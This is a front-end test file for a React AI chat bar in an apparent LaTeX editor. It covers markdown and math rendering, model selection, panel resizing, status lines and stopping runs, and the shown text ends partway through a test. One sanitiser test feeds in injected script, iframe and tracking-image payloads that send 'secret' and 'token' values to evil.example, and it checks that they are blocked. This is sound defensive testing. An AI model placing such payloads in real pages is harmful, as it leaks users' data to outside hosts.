import React from "react";
import { render, screen, fireEvent, waitFor, cleanup } from "@testing-library/react";
import { test, expect, vi, afterEach } from "vitest";

afterEach(() => {
  cleanup();
});
import { FloatingChatBar, SanitizedMarkdown, type ChatContextEntry } from "../components/FloatingChatBar";
import { EnabledModelsContext, type EnabledModelInfo } from "../context/EnabledModelsContext";
import type { AgentRunController } from "../hooks/useAgentRun";

function makeModel(id: string, name: string): EnabledModelInfo {
  return {
    id,
    name,
    supports_vision: false,
    verified: true,
    prompt_price_per_token: 0.000003,
    completion_price_per_token: 0.000015,
  };
}

function withModels(models: EnabledModelInfo[], ui: React.ReactElement): React.ReactElement {
  return (
    <EnabledModelsContext.Provider value={{ models, loading: false, refresh: async () => {} }}>
      {ui}
    </EnabledModelsContext.Provider>
  );
}

test("chat reply renders latex math and emphasis instead of the raw source", () => {
  const { container } = render(
    <SanitizedMarkdown
      content={[
        "The loss is $\\mathrm{MAE}$ and a price of $5 and $10 stays text.",
        "",
        "\\[",
        "y_i = \\frac{E}{N_i}",
        "\\]",
        "",
        "See the *Energy Calibration* section.",
        "**The target variable $y_i$** is the energy saved.",
      ].join("\n")}
    />
  );

  expect(container.querySelectorAll(".katex-html").length).toBe(3);
  expect(container.querySelector(".lemma-math-display .katex-html")).not.toBeNull();
  expect(container.innerHTML).not.toContain("\\[");
  expect(container.textContent).toContain("$5 and $10");
  expect(container.querySelector("em")?.textContent).toBe("Energy Calibration");
  const strong = container.querySelector("strong");
  expect(strong?.textContent).toContain("The target variable");
  expect(strong?.querySelector(".katex")).not.toBeNull();
});

test("test_sanitized_markdown_blocks_remote_images_and_prompts_before_external_links", () => {
  const maliciousMarkdown = [
    "Here is a critique of your methodology.",
    '<script>window.stealSecrets()</script>',
    '<iframe src="https://evil.example/frame"></iframe>',
    '<img src="https://evil.example/leak?q=secret">',
    "![tracking pixel](https://evil.example/pixel.png?secret=token)",
    "See the official benchmark at [link](https://example.com/paper) for details.",
  ].join("\n");

  const { container } = render(
    withModels(
      [makeModel("a/model", "Model A")],
      <div>
        <SanitizedMarkdown content={maliciousMarkdown} />
        <FloatingChatBar
          projectId="manuscript-2026"
          activeFile="main.tex"
          quarantinedChunksCount={1}
        />
      </div>
    )
  );

  // 1. Verify NO <img>, <script>, or <iframe> DOM node is rendered anywhere
  const imgNodes = container.querySelectorAll("img");
  const scriptNodes = container.querySelectorAll("script");
  const iframeNodes = container.querySelectorAll("iframe");
  expect(imgNodes.length).toBe(0);
  expect(scriptNodes.length).toBe(0);
  expect(iframeNodes.length).toBe(0);

  // 2. Verify external link is NOT a raw auto-navigating <a> tag and requires confirmation modal
  const linkBtn = screen.getByRole("button", { name: /https:\/\/example\.com\/paper/i });
  expect(linkBtn).toBeInTheDocument();
  expect(screen.queryByRole("dialog", { name: /Confirm opening external URL/i })).toBeNull();

  fireEvent.click(linkBtn);

  const confirmDialog = screen.getByRole("dialog", {
    name: /Confirm opening external URL/i,
  });
  expect(confirmDialog).toBeInTheDocument();
  expect(confirmDialog).toHaveTextContent("https://example.com/paper");

  // Cancel closes the confirmation modal
  const cancelBtn = screen.getByRole("button", { name: /Cancel/i });
  fireEvent.click(cancelBtn);
  expect(screen.queryByRole("dialog", { name: /Confirm opening external URL/i })).toBeNull();

  // 3. Verify FloatingChatBar renders model selector, quarantine warning & override toggle.
  // The chat profile is chosen per prompt, so there is no profile selector.
  expect(screen.getByLabelText(/OpenRouter Model/i)).toBeInTheDocument();
  expect(screen.queryByLabelText(/Prompt Profile/i)).toBeNull();
  expect(screen.getByText(/Quarantined/i)).toBeInTheDocument();
  expect(
    screen.getByLabelText(/Include quarantined chunks/i)
  ).toBeInTheDocument();
});

function makeSseStream() {
  const encoder = new TextEncoder();
  let controller!: ReadableStreamDefaultController<Uint8Array>;
  const stream = new ReadableStream<Uint8Array>({
    start(c) {
      controller = c;
    },
  });
  return {
    stream,
    pushEvent(eventType: string, payload: Record<string, unknown>) {
      const chunk = `event: ${eventType}\ndata: ${JSON.stringify(payload)}\n\n`;
      controller.enqueue(encoder.encode(chunk));
    },
    close() {
      controller.close();
    },
  };
}

function sseResponse(stream: ReadableStream<Uint8Array>, status = 200): Response {
  return {
    ok: status >= 200 && status < 300,
    status,
    body: stream,
    json: async () => ({}),
  } as unknown as Response;
}

function jsonResponse(body: unknown, status = 200): Response {
  return {
    ok: status >= 200 && status < 300,
    status,
    json: async () => body,
    body: null,
  } as unknown as Response;
}

function mockImmediateRunFetch(opts: { reply?: string; profileId?: string } = {}) {
  const sse = makeSseStream();
  let runChatId = "c1";
  return vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") {
      return jsonResponse({ run: null });
    }
    if (url.includes("/runs") && init?.method === "POST") {
      const m = url.match(/\/chats\/([^/]+)\/runs/);
      if (m) runChatId = m[1];
      return jsonResponse(
        {
          run_id: "run-1",
          project_id: "p1",
          chat_id: runChatId,
          profile_id: opts.profileId ?? "writing",
          status: "running",
        },
        201
      );
    }
    if (url === "/api/ai/runs/run-1/events") {
      sse.pushEvent("done", {
        type: "done",
        project_id: "p1",
        chat_id: runChatId,
        reply: opts.reply ?? "Done.",
        profile_id: opts.profileId ?? "writing",
        hunks: [],
      });
      sse.close();
      return sseResponse(sse.stream);
    }
    if (url.includes("/messages")) {
      return jsonResponse({ messages: [] });
    }
    return jsonResponse({});
  });
}

function sentBody(): any {
  const calls = (global.fetch as any).mock.calls;
  const postCall = [...calls]
    .reverse()
    .find((c: any[]) => String(c[0]).includes("/runs") && c[1]?.method === "POST");
  return JSON.parse(postCall[1].body);
}

test("model selector lists exactly the enabled models", () => {
  render(
    withModels(
      [makeModel("a/model", "Model A"), makeModel("b/model", "Model B")],
      <FloatingChatBar projectId="p1" />
    )
  );

  const select = screen.getByLabelText(/OpenRouter Model/i);
  const ids = select.querySelectorAll("option").map((o: any) => String(o.props.value));
  expect(ids).toEqual(["a/model", "b/model"]);
});

test("routes each prompt and shows the profile the server chose", async () => {
  const originalFetch = global.fetch;
  global.fetch = mockImmediateRunFetch({ reply: "Fixed.", profileId: "proofreading" }) as any;
  try {
    render(
      withModels([makeModel("a/model", "Model A")], <FloatingChatBar projectId="p1" />)
    );

    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Proofread this paragraph" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(sentBody().profile_id).toBe("auto");
    });
    const route = await screen.findByTestId("chat-routed-profile");
    expect(route.textContent).toBe("Proofreading");
    expect(route.getAttribute("title")).toBe("Academic Proofreading");
    expect(screen.queryByLabelText(/Prompt Profile/i)).toBeNull();
  } finally {
    global.fetch = originalFetch;
  }
});

test("defaults to first enabled model and sends it", async () => {
  const originalFetch = global.fetch;
  global.fetch = mockImmediateRunFetch({ reply: "Done." }) as any;
  try {
    render(
      withModels(
        [makeModel("a/model", "Model A"), makeModel("b/model", "Model B")],
        <FloatingChatBar projectId="p1" />
      )
    );

    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Polish the abstract" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(sentBody().model).toBe("a/model");
    });
    expect(sentBody().prompt).toBe("Polish the abstract");
    expect(sentBody().profile_id).toBe("auto");
  } finally {
    global.fetch = originalFetch;
  }
});

test("sends the editor selection, cursor, and unsaved buffer", async () => {
  const originalFetch = global.fetch;
  global.fetch = mockImmediateRunFetch({ reply: "Done." }) as any;
  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar
          projectId="p1"
          activeFile="chapters/ch1.tex"
          cursorLine={12}
          bufferText="unsaved chapter"
          selection={{ text: "selected passage", startLine: 12, endLine: 14 }}
        />
      )
    );

    const selChip = screen.getByTestId("chat-selection-chip");
    expect(selChip.textContent).toContain("chapters/ch1.tex");
    expect(selChip.textContent).toContain("[line 12-14]");
    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Tighten this" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(sentBody().active_file).toBe("chapters/ch1.tex");
    });
    expect(sentBody().cursor_line).toBe(12);
    expect(sentBody().buffer_text).toBe("unsaved chapter");
    expect(sentBody().selection).toEqual({
      text: "selected passage",
      start_line: 12,
      end_line: 14,
    });
  } finally {
    global.fetch = originalFetch;
  }
});

test("sends the model the user picked", async () => {
  const originalFetch = global.fetch;
  global.fetch = mockImmediateRunFetch({ reply: "Done." }) as any;
  try {
    render(
      withModels(
        [makeModel("a/model", "Model A"), makeModel("b/model", "Model B")],
        <FloatingChatBar projectId="p1" />
      )
    );

    fireEvent.change(screen.getByLabelText(/OpenRouter Model/i), {
      target: { value: "b/model" },
    });
    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Tighten intro" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(sentBody().model).toBe("b/model");
    });
  } finally {
    global.fetch = originalFetch;
  }
});

test("send is disabled when no models are enabled", async () => {
  const originalFetch = global.fetch;
  global.fetch = vi.fn().mockResolvedValue({
    ok: true,
    status: 200,
    json: () => Promise.resolve({ reply: "should not happen" }),
  });
  try {
    render(withModels([], <FloatingChatBar projectId="p1" />));

    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Anything" },
    });
    const sendBtn = screen.getByRole("button", { name: /Send Prompt/i });
    expect(sendBtn.props.disabled).toBe(true);
    expect(screen.getByLabelText(/OpenRouter Model/i).props.disabled).toBe(true);
    expect(Boolean(screen.getByText("No models enabled — open Settings > Models"))).toBe(true);

    fireEvent.click(sendBtn);
    await new Promise((r) => setTimeout(r, 30));

    expect(global.fetch).toHaveBeenCalledTimes(0);
  } finally {
    global.fetch = originalFetch;
  }
});

test("OpenRouter model selector is disabled without an OpenRouter key", () => {
  render(
    withModels(
      [makeModel("openai/gpt", "GPT"), { ...makeModel("local-llama", "Local"), provider: "local" }],
      <FloatingChatBar projectId="p1" hasOpenRouterKey={false} />
    )
  );

  const select = screen.getByLabelText(/OpenRouter Model/i);
  const values = select.querySelectorAll("option").map((o: any) => String(o.props.value));
  expect(values).toEqual(["local-llama"]);
  expect(select.props.disabled).toBe(false);
});

test("OpenRouter model selector is unusable when every model needs a missing key", () => {
  render(
    withModels(
      [makeModel("openai/gpt", "GPT")],
      <FloatingChatBar projectId="p1" hasOpenRouterKey={false} />
    )
  );

  const select = screen.getByLabelText(/OpenRouter Model/i);
  expect(select.props.disabled).toBe(true);
  expect(select.querySelectorAll("option").length).toBe(0);
  expect(Boolean(screen.getByText("Set an OpenRouter API key to choose a model."))).toBe(true);
  expect(screen.getByRole("button", { name: /Send Prompt/i }).props.disabled).toBe(true);
});

// --- Task 2.8: minimise to bubble ---------------------------------------

function bubbleHarness() {
  try {
    localStorage.removeItem("lemma_chat_bubble_v1");
  } catch {
    // ignore
  }
}

function renderBar(props: Partial<React.ComponentProps<typeof FloatingChatBar>> = {}) {
  return render(
    withModels([makeModel("a/model", "Model A")], <FloatingChatBar projectId="p1" {...props} />)
  );
}

test("test_minimise_shows_bubble_and_hides_panel", () => {
  bubbleHarness();
  renderBar();
  expect(screen.queryByRole("button", { name: /Open AI assistant/i })).toBeNull();
  expect(screen.getByTestId("floating-chat-bar").props.hidden).toBeFalsy();

  fireEvent.click(screen.getByRole("button", { name: "Minimise to bubble" }));

  expect(screen.getByRole("button", { name: /Open AI assistant/i })).toBeDefined();
  expect(screen.getByTestId("floating-chat-bar").props.hidden).toBe(true);
});

test("test_bubble_click_restores_panel_with_history", () => {
  bubbleHarness();
  renderBar({ initialMessages: [{ role: "user", content: "Remember me" }] });

  fireEvent.click(screen.getByRole("button", { name: "Minimise to bubble" }));
  const bubble = screen.getByRole("button", { name: /Open AI assistant/i });
  // Panel stays mounted (hidden) so history survives.
  expect(screen.getByText("Remember me")).toBeDefined();

  const evt = {
    pointerId: 1,
    clientX: 10,
    clientY: 10,
    currentTarget: { setPointerCapture() {}, releasePointerCapture() {} },
    preventDefault() {},
  };
  bubble.props.onPointerDown(evt);
  bubble.props.onPointerUp(evt);

  expect(screen.getByTestId("floating-chat-bar").props.hidden).toBeFalsy();
  expect(screen.queryByRole("button", { name: /Open AI assistant/i })).toBeNull();
  expect(screen.getByText("Remember me")).toBeDefined();
});

test("test_minimised_state_persists_across_remount", () => {
  bubbleHarness();
  const first = renderBar();
  fireEvent.click(screen.getByRole("button", { name: "Minimise to bubble" }));
  first.unmount();

  renderBar();
  expect(screen.getByRole("button", { name: /Open AI assistant/i })).toBeDefined();
  expect(screen.getByTestId("floating-chat-bar").props.hidden).toBe(true);
  bubbleHarness();
});

test("test_bubble_shows_pending_hunks_count", () => {
  bubbleHarness();
  const view = renderBar({ pendingCount: 0 });
  fireEvent.click(screen.getByRole("button", { name: "Minimise to bubble" }));
  expect(screen.getByRole("button", { name: "Open AI assistant" })).toBeDefined();

  view.rerender(
    withModels(
      [makeModel("a/model", "Model A")],
      <FloatingChatBar projectId="p1" pendingCount={3} />
    )
  );
  expect(
    screen.getByRole("button", { name: "Open AI assistant, 3 suggestions waiting" })
  ).toBeDefined();
  // no auto-expand
  expect(screen.getByTestId("floating-chat-bar").props.hidden).toBe(true);
  bubbleHarness();
});

test("test_attach_is_icon_button_with_accessible_name", () => {
  bubbleHarness();
  renderBar();
  const attach = screen.getByTestId("floating-chat-bar").querySelector(".lemma-chat-attach-btn");
  expect(attach.getAttribute("aria-label")).toBe("Attach");
});

// --- Resizable panel height (top-edge handle) --------------------------------

function heightHandle() {
  return screen.getByRole("separator", { name: "Resize chat panel" });
}

function dragHandle(y0: number, y1: number) {
  const el = heightHandle();
  const evt = (clientY: number) => ({
    pointerId: 1,
    clientX: 0,
    clientY,
    button: 0,
    currentTarget: { setPointerCapture() {}, releasePointerCapture() {} },
    preventDefault() {},
  });
  el.props.onPointerDown(evt(y0));
  el.props.onPointerMove(evt(y1));
  el.props.onPointerUp(evt(y1));
}

function panelHeight(): string | undefined {
  return screen.getByTestId("floating-chat-bar").props.style?.["--chat-panel-h"];
}

test("test_resize_handle_present_on_docked_chat_bar", () => {
  bubbleHarness();
  renderBar();
  expect(heightHandle().getAttribute("aria-orientation")).toBe("horizontal");
  expect(String(screen.getByTestId("floating-chat-bar").props.className)).toContain("expanded");
  expect(heightHandle()).toBeDefined();
});

test("test_drag_up_grows_and_drag_down_shrinks_panel_height", () => {
  bubbleHarness();
  renderBar();
  dragHandle(300, 250); // up 50
  const grown = parseInt(panelHeight() as string, 10);
  expect(grown).toBe(50);
  dragHandle(300, 320); // down 20
  expect(parseInt(panelHeight() as string, 10)).toBe(30);
});

test("test_resized_empty_panel_keeps_messages_list_in_layout", () => {
  bubbleHarness();
  renderBar();
  const messagesClass = () => screen.getByTestId("chat-messages-list").className;
  // `.is-empty` is display:none, and the list is the only element sized by --chat-panel-h.
  expect(messagesClass().split(/\s+/)).toContain("is-empty");

  // happy-dom leaves clientHeight at 0, and a zero-sized layer refuses to store a height.
  const bar = screen.getByTestId("floating-chat-bar");
  const layer = bar.parentElement;
  if (layer && layer.clientHeight === 0) {
    Object.defineProperty(layer, "clientHeight", { configurable: true, get: () => 800 });
  }

  const handle = screen.getByRole("separator", { name: "Resize chat panel" });
  const pointer = (clientY: number) => ({ pointerId: 1, button: 0, buttons: 1, clientX: 0, clientY, bubbles: true });
  // Downward drag on the compact pill does not allocate message height yet.
  fireEvent.pointerDown(handle, pointer(200));
  fireEvent.pointerMove(handle, pointer(216));
  fireEvent.pointerUp(handle, pointer(216));
  expect(messagesClass().split(/\s+/)).toContain("is-empty");
  expect(bar.style.getPropertyValue("--chat-panel-h")).toBe("");

  // The first upward drag grows from 0, not from the 260px stylesheet default.
  fireEvent.pointerDown(handle, pointer(300));
  fireEvent.pointerMove(handle, pointer(200));
  fireEvent.pointerUp(handle, pointer(200));
  const grown = bar.style.getPropertyValue("--chat-panel-h");
  expect(grown).toBe("100px");
  expect(messagesClass().split(/\s+/), `--chat-panel-h=${grown}`).not.toContain("is-empty");

  // Shrinking below the default pill snaps back to compact (no awkward in-between).
  fireEvent.pointerDown(handle, pointer(200));
  fireEvent.pointerMove(handle, pointer(250));
  fireEvent.pointerUp(handle, pointer(250));
  expect(bar.style.getPropertyValue("--chat-panel-h")).toBe("");
  expect(messagesClass().split(/\s+/)).toContain("is-empty");
  fireEvent.doubleClick(handle);
  expect(bar.style.getPropertyValue("--chat-panel-h")).toBe("");
  expect(messagesClass().split(/\s+/)).toContain("is-empty");
});

test("test_panel_height_clamped_at_min", () => {
  bubbleHarness();
  renderBar({
    initialMessages: [
      { role: "user", content: "hello" },
      { role: "assistant", content: "hi" },
    ],
  });
  dragHandle(400, 100);
  dragHandle(0, 5000);
  expect(panelHeight()).toBe("60px");
  expect(heightHandle().getAttribute("aria-valuenow")).toBe("60");
});

test("test_empty_shrink_below_default_pill_snaps_back_to_compact", () => {
  bubbleHarness();
  renderBar();
  dragHandle(300, 200);
  expect(panelHeight()).toBe("100px");
  dragHandle(200, 400);
  expect(panelHeight()).toBe(undefined);
  expect(screen.getByTestId("chat-messages-list").className.split(/\s+/)).toContain("is-empty");
});

test("test_keyboard_arrows_resize_panel", () => {
  bubbleHarness();
  renderBar();
  fireEvent.keyDown(heightHandle(), { key: "ArrowUp" });
  const up = parseInt(panelHeight() as string, 10);
  fireEvent.keyDown(heightHandle(), { key: "ArrowDown" });
  expect(up - parseInt(panelHeight() as string, 10)).toBe(16);
  expect(up).toBe(16);
});

test("test_dblclick_resets_panel_height", () => {
  bubbleHarness();
  renderBar();
  fireEvent.keyDown(heightHandle(), { key: "ArrowUp" });
  expect(panelHeight()).toBe("16px");
  fireEvent.doubleClick(heightHandle());
  expect(panelHeight()).toBe(undefined);
});

test("test_height_survives_minimise", () => {
  bubbleHarness();
  renderBar();
  fireEvent.keyDown(heightHandle(), { key: "ArrowUp" });
  expect(panelHeight()).toBe("16px");
  fireEvent.click(screen.getByRole("button", { name: "Minimise to bubble" }));
  expect(screen.getByTestId("floating-chat-bar").props.hidden).toBe(true);
  expect(panelHeight()).toBe("276px");
  bubbleHarness();
});


// --- Layer-aware behaviour: fake DOM nodes have no parentElement/contains/clientHeight, so add them ----

// Gives the panel a fake host element (the chat layer) and `contains`/`focus` on every node; returns a restorer.
function installLayerHost(clientHeight: number) {
  const proto = Object.getPrototypeOf(screen.getByTestId("floating-chat-bar"));
  const host = { clientHeight, getBoundingClientRect: () => ({ left: 0, top: 0, width: 800, height: clientHeight }) };
  const focused: any[] = [];
  const saved: Record<string, PropertyDescriptor | undefined> = {};
  const define = (name: string, desc: PropertyDescriptor) => {
    saved[name] = Object.getOwnPropertyDescriptor(proto, name);
    Object.defineProperty(proto, name, { configurable: true, ...desc });
  };
  define("parentElement", {
    get() {
      return this.props["data-testid"] === "floating-chat-bar" ? host : undefined;
    },
  });
  define("contains", {
    value(n: any) {
      for (let c = n; c; c = c.parent) if (c === this) return true;
      return false;
    },
  });
  define("focus", {
    value() {
      focused.push(this);
    },
  });
  const restore = () => {
    for (const [name, desc] of Object.entries(saved)) {
      if (desc) Object.defineProperty(proto, name, desc);
      else delete proto[name];
    }
  };
  return { host, focused, restore };
}

// Renders with the fake host installed (so mount effects see the layer). The host must exist before the effects run,
// so install it on the prototype of an initial throwaway render first.
function renderWithLayer(clientHeight: number) {
  bubbleHarness();
  renderBar();
  const layer = installLayerHost(clientHeight);
  cleanup();
  bubbleHarness();
  renderBar();
  // The fake renderer drops state set by mount effects (the outer render overwrites the nested one): force a re-render.
  fireEvent.keyDown(heightHandle(), { key: "ArrowUp" });
  fireEvent.keyDown(heightHandle(), { key: "ArrowDown" });
  return layer;
}

function installResizeObserverStub() {
  const observed: any[] = [];
  const callbacks: Array<() => void> = [];
  (globalThis as any).ResizeObserver = class {
    constructor(cb: () => void) {
      callbacks.push(cb);
    }
    observe(el: any) {
      observed.push(el);
    }
    disconnect() {}
    unobserve() {}
  };
  return {
    observed,
    notify: () => callbacks[callbacks.length - 1](),
    restore: () => {
      delete (globalThis as any).ResizeObserver;
    },
  };
}

test("test_aria_valuemax_follows_layer_size_via_resize_observer", () => {
  const ro = installResizeObserverStub();
  const layer = renderWithLayer(800);
  try {
    // 800 - 150 chrome; measured after mount, not read during render
    expect(heightHandle().getAttribute("aria-valuemax")).toBe("650");
    expect(ro.observed[0]).toBe(layer.host);

    layer.host.clientHeight = 500;
    ro.notify();
    expect(heightHandle().getAttribute("aria-valuemax")).toBe("350");

    layer.host.clientHeight = 0; // hidden layer: keep the last good bound instead of jumping to 1200
    ro.notify();
    expect(heightHandle().getAttribute("aria-valuemax")).toBe("350");

    layer.host.clientHeight = 100; // tiny layer: never below the minimum panel height
    ro.notify();
    expect(heightHandle().getAttribute("aria-valuemax")).toBe("60");
  } finally {
    ro.restore();
    layer.restore();
  }
});

test("test_aria_valuemax_falls_back_to_window_resize_without_resize_observer", () => {
  const listeners: Record<string, () => void> = {};
  (globalThis as any).addEventListener = (type: string, fn: () => void) => {
    listeners[type] = fn;
  };
  (globalThis as any).removeEventListener = (type: string) => {
    delete listeners[type];
  };
  const layer = renderWithLayer(800);
  try {
    expect(heightHandle().getAttribute("aria-valuemax")).toBe("650");
    layer.host.clientHeight = 600;
    listeners.resize();
    expect(heightHandle().getAttribute("aria-valuemax")).toBe("450");
  } finally {
    delete (globalThis as any).addEventListener;
    delete (globalThis as any).removeEventListener;
    layer.restore();
  }
});

test("test_drag_is_ignored_while_layer_is_zero_sized", () => {
  const layer = renderWithLayer(800);
  try {
    layer.host.clientHeight = 0;
    fireEvent.keyDown(heightHandle(), { key: "ArrowUp" });
    expect(panelHeight()).toBe(undefined); // nothing persisted while hidden
    layer.host.clientHeight = 800;
    fireEvent.keyDown(heightHandle(), { key: "ArrowUp" });
    expect(panelHeight()).toBe("16px");
  } finally {
    layer.restore();
  }
});

test("test_drag_is_clamped_to_measured_layer_height", () => {
  const layer = renderWithLayer(400); // max = 250
  try {
    dragHandle(300, -5000);
    expect(panelHeight()).toBe("250px");
    expect(heightHandle().getAttribute("aria-valuenow")).toBe("250");
  } finally {
    layer.restore();
  }
});

test("test_minimised_bubble_observes_the_chat_layer", () => {
  const ro = installResizeObserverStub();
  const layer = renderWithLayer(800);
  try {
    const before = ro.observed.length;
    fireEvent.click(screen.getByRole("button", { name: "Minimise to bubble" }));
    // panel re-measure (deps: minimised) + the bubble's own observer
    expect(ro.observed.length - before).toBe(2);
    expect(ro.observed.slice(before).every((el) => el === layer.host)).toBe(true);
  } finally {
    ro.restore();
    layer.restore();
    bubbleHarness();
  }
});

// --- Task 3.3: status lines, copy button, filename pill, Stop button, global send lock ---

test("test_streams_status_lines_with_copy_button_and_filename_pill_on_proposed_edit", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  const originalClipboard = navigator.clipboard;
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", {
    configurable: true,
    value: { writeText },
  });

  const sse = makeSseStream();
  global.fetch = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") {
      return jsonResponse({ run: null });
    }
    if (url === "/api/projects/p1/chats/chat_edit/runs" && init?.method === "POST") {
      return jsonResponse(
        {
          run_id: "run-edit",
          project_id: "p1",
          chat_id: "chat_edit",
          profile_id: "writing",
          status: "running",
        },
        201
      );
    }
    if (url === "/api/ai/runs/run-edit/events") {
      return sseResponse(sse.stream);
    }
    if (url === "/api/projects/p1/chats/chat_edit/messages") {
      return jsonResponse({ messages: [] });
    }
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="chat_edit" activeFile="main.tex" />
      )
    );

    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Improve the intro" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(screen.getByRole("button", { name: "Stop run" })).toBeTruthy();
    });

    // Running indicator replaces old three-dot typing spinner
    expect(document.querySelector(".lemma-chat-status-running")).not.toBeNull();
    expect(document.querySelector(".lemma-chat-typing")).toBeNull();

    sse.pushEvent("status", {
      type: "status",
      project_id: "p1",
      chat_id: "chat_edit",
      message_id: "s1",
      content: "Reading main.tex",
    });

    await waitFor(() => {
      const lines = screen.getAllByTestId("chat-status-line");
      expect(lines.length).toBe(1);
      expect(lines[0].querySelector(".lemma-chat-status-text")?.textContent).toBe("Reading main.tex");
    });

    // Copy button copies status line text and temporarily shows "Copied"
    const copyBtn = screen.getByRole("button", { name: "Copy status line" });
    fireEvent.click(copyBtn);
    expect(writeText).toHaveBeenCalledWith("Reading main.tex");
    await waitFor(() => {
      expect(copyBtn.textContent).toBe("Copied");
    });

    sse.pushEvent("status", {
      type: "status",
      project_id: "p1",
      chat_id: "chat_edit",
      message_id: "s2",
      content: "Proposed an edit to main.tex",
      pill_file: "main.tex",
    });

    await waitFor(() => {
      const lines = screen.getAllByTestId("chat-status-line");
      expect(lines.length).toBe(2);
      const pill = screen.getByTestId("chat-status-pill");
      expect(pill.textContent).toBe("main.tex");
      expect(lines[1].textContent).toContain("Proposed an edit to main.tex");
      expect(lines[1].textContent?.toLowerCase()).not.toContain("updated");
    });

    sse.pushEvent("done", {
      type: "done",
      project_id: "p1",
      chat_id: "chat_edit",
      reply: "I proposed a clearer opening sentence.",
      profile_id: "writing",
      hunks: [],
    });
    sse.close();

    await waitFor(() => {
      expect(screen.getByText("I proposed a clearer opening sentence.")).toBeTruthy();
      expect(screen.queryByRole("button", { name: "Stop run" })).toBeNull();
    });
  } finally {
    global.fetch = originalFetch;
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: originalClipboard,
    });
    bubbleHarness();
  }
});

test("test_explanation_reply_shows_status_lines_without_filename_pill", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  const sse = makeSseStream();
  global.fetch = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") return jsonResponse({ run: null });
    if (url === "/api/projects/p1/chats/chat_explain/runs" && init?.method === "POST") {
      return jsonResponse(
        { run_id: "run-exp", project_id: "p1", chat_id: "chat_explain", status: "running" },
        201
      );
    }
    if (url === "/api/ai/runs/run-exp/events") return sseResponse(sse.stream);
    if (url === "/api/projects/p1/chats/chat_explain/messages") return jsonResponse({ messages: [] });
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="chat_explain" />
      )
    );

    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Explain this equation" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(screen.getByRole("button", { name: "Stop run" })).toBeTruthy();
    });

    sse.pushEvent("status", {
      type: "status",
      project_id: "p1",
      chat_id: "chat_explain",
      message_id: "s1",
      content: "Reading main.tex",
    });

    await waitFor(() => {
      expect(screen.getAllByTestId("chat-status-line").length).toBe(1);
    });

    sse.pushEvent("done", {
      type: "done",
      project_id: "p1",
      chat_id: "chat_explain",
      reply: "This equation computes the mean absolute error.",
      hunks: [],
    });
    sse.close();

    await waitFor(() => {
      expect(screen.getByText("This equation computes the mean absolute error.")).toBeTruthy();
    });
    expect(screen.getAllByTestId("chat-status-line").length).toBe(1);
    expect(screen.queryByTestId("chat-status-pill")).toBeNull();
  } finally {
    global.fetch = originalFetch;
    bubbleHarness();
  }
});

test("test_stop_button_cancels_run_preserves_lines_and_reenables_send", async () => {
  bubbleHarness();
  const originalFetch = global.fetch;
  const sse = makeSseStream();
  const stopCalls: string[] = [];

  global.fetch = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url === "/api/ai/runs/active") return jsonResponse({ run: null });
    if (url === "/api/projects/p1/chats/chat_stop/runs" && init?.method === "POST") {
      return jsonResponse(
        { run_id: "run-stop", project_id: "p1", chat_id: "chat_stop", status: "running" },
        201
      );
    }
    if (url === "/api/ai/runs/run-stop/events") return sseResponse(sse.stream);
    if (url === "/api/ai/runs/run-stop/stop" && init?.method === "POST") {
      stopCalls.push(url);
      return jsonResponse({ status: "stopped" });
    }
    if (url === "/api/projects/p1/chats/chat_stop/messages") return jsonResponse({ messages: [] });
    throw new Error(`Unexpected fetch: ${url}`);
  }) as any;

  try {
    render(
      withModels(
        [makeModel("a/model", "Model A")],
        <FloatingChatBar projectId="p1" chatId="chat_stop" />
      )
    );

    fireEvent.change(screen.getByLabelText("AI Chat Prompt"), {
      target: { value: "Rewrite section 2" },
    });
    fireEvent.click(screen.getByRole("button", { name: /Send Prompt/i }));

    await waitFor(() => {
      expect(screen.getByRole("button", { name: "Stop run" })).toBeTruthy();
    });

    sse.pushEvent("status", {
      type: "status",
      project_id: "p1",
      chat_id: "chat_stop",
      message_id: "s1",
      content: "Reading main.tex",
    });

    await waitFor(() => {
      expect(screen.getAllByTestId("chat-status-line").length).toBe(1);
    });

    const sendBtn = screen.getByRole("button", { name: /Send Prompt/i }) as HTMLButtonElement;
    expect(sendBtn.disabled).toBe(true);

    fireEvent.click(screen.getByRole("button", { name: "Stop run" }));

    await waitFor(() => {
      expect(stopCalls).toEqual(["/api/ai/runs/run-stop/stop"]);
      expect(screen.queryByRole("button", { name: "Stop run" })).toBeNull();
      expect((screen.getByRole("button", { name: /Send Prompt/i }) as HTMLButtonElement).disabled).toBe(
        false
      );
    });

